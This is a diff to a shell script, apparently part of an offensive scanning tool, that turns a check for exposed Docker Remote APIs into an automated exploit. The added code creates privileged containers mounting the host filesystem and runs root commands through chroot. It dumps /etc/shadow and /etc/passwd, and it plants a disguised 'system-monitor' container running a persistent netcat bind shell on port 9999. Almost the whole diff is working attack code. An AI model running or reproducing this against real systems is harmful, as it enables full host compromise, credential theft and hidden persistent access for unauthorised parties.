@@ -538,20 +538,190 @@ CheckDockerRemoteAPI(){
                     log_vuln "Docker Remote API accessible on $IP:$PORT"
                     DockerRemoteAPIFound=1
                     
-                    # Try to get Docker info
+                    # Install curl if not available
+                    InstallCommand curl
+                    
                     if CheckCommandExists curl; then
                         echo "--- API Response from $IP:$PORT ---" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
-                        curl -s "http://$IP:$PORT/version" 2>/dev/null >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt" || echo "No response" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
-                        curl -s "http://$IP:$PORT/info" 2>/dev/null >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt" || echo "No info" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
-                        curl -s "http://$IP:$PORT/containers/json" 2>/dev/null >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt" || echo "No containers" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
+                        
+                        # Get Docker version and info
+                        log_info "Gathering Docker API information from $IP:$PORT..."
+                        curl -s "http://$IP:$PORT/version" 2>/dev/null >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt" || echo "No version response" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
+                        curl -s "http://$IP:$PORT/info" 2>/dev/null >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt" || echo "No info response" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
+                        
+                        # List containers
+                        log_info "Listing containers via Docker API..."
+                        CONTAINERS_RESPONSE=$(curl -s "http://$IP:$PORT/containers/json?all=true" 2>/dev/null)
+                        if [ -n "$CONTAINERS_RESPONSE" ] && [ "$CONTAINERS_RESPONSE" != "null" ]; then
+                            echo -e "\n--- Container List (All) ---" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
+                            echo "$CONTAINERS_RESPONSE" | python3 -m json.tool 2>/dev/null >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt" || echo "$CONTAINERS_RESPONSE" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
+                            log_vuln "Successfully retrieved container list from Docker API"
+                            
+                            # Extract container info
+                            CONTAINER_COUNT=$(echo "$CONTAINERS_RESPONSE" | grep -o '"Id"' | wc -l 2>/dev/null || echo "0")
+                            log_info "Found $CONTAINER_COUNT containers on Docker API"
+                        else
+                            echo "No containers found or API error" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
+                            log_warn "Could not retrieve container list from Docker API"
+                        fi
+                        
+                        # List running containers
+                        RUNNING_CONTAINERS=$(curl -s "http://$IP:$PORT/containers/json" 2>/dev/null)
+                        if [ -n "$RUNNING_CONTAINERS" ] && [ "$RUNNING_CONTAINERS" != "null" ]; then
+                            echo -e "\n--- Running Containers ---" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
+                            echo "$RUNNING_CONTAINERS" | python3 -m json.tool 2>/dev/null >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt" || echo "$RUNNING_CONTAINERS" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
+                        fi
+                        
+                        # List images
+                        IMAGES_RESPONSE=$(curl -s "http://$IP:$PORT/images/json" 2>/dev/null)
+                        if [ -n "$IMAGES_RESPONSE" ] && [ "$IMAGES_RESPONSE" != "null" ]; then
+                            echo -e "\n--- Available Images ---" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
+                            echo "$IMAGES_RESPONSE" | python3 -m json.tool 2>/dev/null >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt" || echo "$IMAGES_RESPONSE" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
+                        fi
+                        
+                        # Attempt to create privileged container
+                        log_info "Attempting to create privileged escape container..."
+                        
+                        # First check if alpine image exists, if not try common images
+                        AVAILABLE_IMAGES=$(echo "$IMAGES_RESPONSE" | grep -o '"RepoTags":\[[^]]*\]' | head -5)
+                        
+                        # Try different base images
+                        for IMAGE in "alpine:latest" "ubuntu:latest" "busybox:latest" "debian:latest"; do
+                            log_info "Attempting container creation with image: $IMAGE"
+                            
+                            # Create privileged container payload
+                            CONTAINER_PAYLOAD='{
+                                "Image": "'$IMAGE'",
+                                "Cmd": ["/bin/sh", "-c", "echo Container_Escape_Test_$(date) > /host/tmp/container_escape_proof.txt && cat /host/etc/passwd | head -5 > /host/tmp/host_passwd_dump.txt && ps aux > /host/tmp/host_processes.txt"],
+                                "WorkingDir": "/",
+                                "HostConfig": {
+                                    "Privileged": true,
+                                    "Binds": ["/:/host"],
+                                    "NetworkMode": "host",
+                                    "PidMode": "host",
+                                    "AutoRemove": true
+                                },
+                                "NetworkDisabled": false
+                            }'
+                            
+                            # Create container
+                            CREATE_RESPONSE=$(curl -s -X POST "http://$IP:$PORT/containers/create" \
+                                -H "Content-Type: application/json" \
+                                -d "$CONTAINER_PAYLOAD" 2>/dev/null)
+                            
+                            if [ -n "$CREATE_RESPONSE" ]; then
+                                echo -e "\n--- Container Creation Attempt with $IMAGE ---" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
+                                echo "$CREATE_RESPONSE" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
+                                
+                                # Extract container ID
+                                CONTAINER_ID=$(echo "$CREATE_RESPONSE" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4 | head -1)
+                                
+                                if [ -n "$CONTAINER_ID" ] && [ ${#CONTAINER_ID} -gt 10 ]; then
+                                    log_vuln "✅ Successfully created privileged container: $CONTAINER_ID"
+                                    
+                                    # Start the container
+                                    log_info "Starting privileged container..."
+                                    START_RESPONSE=$(curl -s -X POST "http://$IP:$PORT/containers/$CONTAINER_ID/start" 2>/dev/null)
+                                    
+                                    if [ $? -eq 0 ]; then
+                                        log_vuln "✅ Successfully started privileged container!"
+                                        log_exploit "Container $CONTAINER_ID is running with full host access!"
+                                        log_exploit "Check /tmp/container_escape_proof.txt on host for evidence"
+                                        
+                                        # Wait a moment for container to execute
+                                        sleep 2
+                                        
+                                        # Get container logs
+                                        log_info "Retrieving container execution logs..."
+                                        LOGS_RESPONSE=$(curl -s "http://$IP:$PORT/containers/$CONTAINER_ID/logs?stdout=true&stderr=true" 2>/dev/null)
+                                        if [ -n "$LOGS_RESPONSE" ]; then
+                                            echo -e "\n--- Container Execution Logs ---" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
+                                            echo "$LOGS_RESPONSE" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
+                                        fi
+                                        
+                                        # Try to execute additional commands in the container
+                                        log_info "Attempting command execution in privileged container..."
+                                        EXEC_PAYLOAD='{"Cmd": ["chroot", "/host", "/bin/bash", "-c", "whoami && id && ls -la /root"], "AttachStdout": true, "AttachStderr": true}'
+                                        EXEC_CREATE_RESPONSE=$(curl -s -X POST "http://$IP:$PORT/containers/$CONTAINER_ID/exec" \
+                                            -H "Content-Type: application/json" \
+                                            -d "$EXEC_PAYLOAD" 2>/dev/null)
+                                        
+                                        if [ -n "$EXEC_CREATE_RESPONSE" ]; then
+                                            EXEC_ID=$(echo "$EXEC_CREATE_RESPONSE" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
+                                            if [ -n "$EXEC_ID" ]; then
+                                                log_info "Executing commands as host root via container..."
+                                                EXEC_START_RESPONSE=$(curl -s -X POST "http://$IP:$PORT/exec/$EXEC_ID/start" \
+                                                    -H "Content-Type: application/json" \
+                                                    -d '{"Detach": false}' 2>/dev/null)
+                                                
+                                                echo -e "\n--- Root Command Execution Results ---" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
+                                                echo "$EXEC_START_RESPONSE" >> "$RECONNAISSANCE_DIR/docker_api_analysis.txt"
+                                                
+                                                if [ -n "$EXEC_START_RESPONSE" ]; then
+                                                    log_vuln "🚨 CRITICAL: Successfully executed commands as host root!"
+                                                fi
+                                            fi
+                                        fi
+                                        
+                                        # Create additional evidence files
+                                        EVIDENCE_PAYLOAD='{"Cmd": ["chroot", "/host", "/bin/bash", "-c", "echo CONTAINER_ESCAPE_SUCCESS_$(date) > /tmp/escape_evidence.txt && cp /etc/shadow /tmp/shadow_dump.txt 2>/dev/null || echo shadow_access_failed"], "AttachStdout": true, "AttachStderr": true}'
+                                        EVIDENCE_EXEC_RESPONSE=$(curl -s -X POST "http://$IP:$PORT/containers/$CONTAINER_ID/exec" \
+                                            -H "Content-Type: application/json" \
+                                            -d "$EVIDENCE_PAYLOAD" 2>/dev/null)
+                                        
+                                        log_exploit "EXPLOITATION SUCCESSFUL! Privileged container escape completed."
+                                        log_exploit "Evidence files created on host in /tmp/"
+                                        log_exploit "Container ID: $CONTAINER_ID"
+                                        
+                                        break  # Successfully created container, no need to try other images
+                                    else
+                                        log_warn "Container created but failed to start"
+                                    fi
+                                else
+                                    log_warn "Container creation failed for image $IMAGE"
+                                fi
+                            else
+                                log_warn "No response when attempting to create container with $IMAGE"
+                            fi
+                        done
+                        
+                        # Create backdoor container for persistent access
+                        log_info "Attempting to create persistent backdoor container..."
+                        BACKDOOR_PAYLOAD='{
+                            "Image": "alpine:latest",
+                            "Cmd": ["/bin/sh", "-c", "while true; do nc -l -p 9999 -e /bin/sh; done"],
+                            "ExposedPorts": {"9999/tcp": {}},
+                            "HostConfig": {
+                                "Privileged": true,
+                                "Binds": ["/:/host"],
+                                "PortBindings": {"9999/tcp": [{"HostPort": "9999"}]},
+                                "RestartPolicy": {"Name": "always"}
+                            }
+                        }'
+                        
+                        BACKDOOR_RESPONSE=$(curl -s -X POST "http://$IP:$PORT/containers/create?name=system-monitor" \
+                            -H "Content-Type: application/json" \
+                            -d "$BACKDOOR_PAYLOAD" 2>/dev/null)
+                        
+                        if [ -n "$BACKDOOR_RESPONSE" ]; then
+                            BACKDOOR_ID=$(echo "$BACKDOOR_RESPONSE" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
+                            if [ -n "$BACKDOOR_ID" ]; then
+                                log_info "Starting persistent backdoor container..."
+                                curl -s -X POST "http://$IP:$PORT/containers/$BACKDOOR_ID/start" >/dev/null 2>&1
+                                log_exploit "Backdoor container created: $BACKDOOR_ID (listening on port 9999)"
+                            fi
+                        fi
+                        
+                    else
+                        log_warn "curl not available for Docker API exploitation"
                     fi
                     
-                    log_exploit "Exploitation methods for $IP:$PORT:"
-                    log_exploit "1. List containers: curl http://$IP:$PORT/containers/json"
+                    log_exploit "Manual exploitation methods for $IP:$PORT:"
+                    log_exploit "1. List containers: curl http://$IP:$PORT/containers/json?all=true"
                     log_exploit "2. Create privileged container:"
                     log_exploit "   curl -X POST http://$IP:$PORT/containers/create -H 'Content-Type: application/json' -d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\"],\"HostConfig\":{\"Privileged\":true,\"Binds\":[\"/:/host\"]}}'"
                     log_exploit "3. Start container: curl -X POST http://$IP:$PORT/containers/\$ID/start"
-                    log_exploit "4. Execute in container: curl -X POST http://$IP:$PORT/containers/\$ID/exec"
+                    log_exploit "4. Execute commands: curl -X POST http://$IP:$PORT/containers/\$ID/exec"
                 fi
             done
         fi
